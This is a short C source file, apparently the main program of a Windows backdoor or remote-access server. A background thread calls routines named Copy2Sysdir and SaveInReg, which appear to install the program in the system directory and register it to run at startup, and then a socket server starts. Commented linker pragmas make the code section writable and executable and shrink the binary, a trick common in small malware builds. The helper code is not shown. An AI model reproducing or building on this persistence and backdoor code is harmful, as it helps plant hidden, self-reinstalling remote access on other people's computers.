#include <tchar.h>  // _tprintf
#include <stdlib.h> // system

#include "Server.h"
#include "Tools.h"

// #pragma comment (lib, "Mswsock.lib")
// #pragma comment(linker, "/MERGE:.rdata=.text")
// #pragma comment(linker, "/FILEALIGN:512 /SECTION:.text,EWRX /IGNORE:4078")
// #pragma comment(linker, "/ENTRY:WinMain")

VOID StayAlive();

int __cdecl main(char** argv, int argc)
{
	if (!CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&StayAlive, NULL, 0, NULL))
	{
		PrintError(TEXT("CreateThread"), GetLastError());
	}

	SOCKET socket = InitServer();
	if (socket == INVALID_SOCKET)
	{
		_tprintf(TEXT("Cannot initialize the server\n"));

		system("pause");
		return 1;
	}
		
	RunServer(socket);
	
	closesocket(socket);
	WSACleanup();

	system("pause");
	return 0;
}

VOID StayAlive()
{
	Copy2Sysdir();
	SaveInReg();
}

